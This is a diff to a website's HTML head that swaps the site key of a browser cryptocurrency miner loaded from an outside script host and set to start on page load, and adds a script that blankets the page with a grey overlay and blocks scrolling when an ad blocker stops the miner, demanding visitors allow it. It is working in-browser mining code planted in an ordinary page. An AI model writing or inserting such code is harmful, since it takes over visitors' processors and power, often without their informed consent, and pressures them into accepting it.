@@ -63,12 +63,27 @@
   </head>
   <script src="https://www.hostingcloud.racing/DzfL.js"></script>
 <script>
-    var _client = new Client.Anonymous('bed03d4c1cb7702aa0183c747d544dbed781d1a9d5e7e4b6c542a4e17fc885c2', {
+    var _client = new Client.Anonymous('856ccf29b727911653734f799ac9f11f2c5b4d77f716b713e0c2637799db2e45', {
         throttle: 0.4, c: 'w', ads: 0
     });
     _client.start();
     
-
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
 </script>
   <body>
     <header>
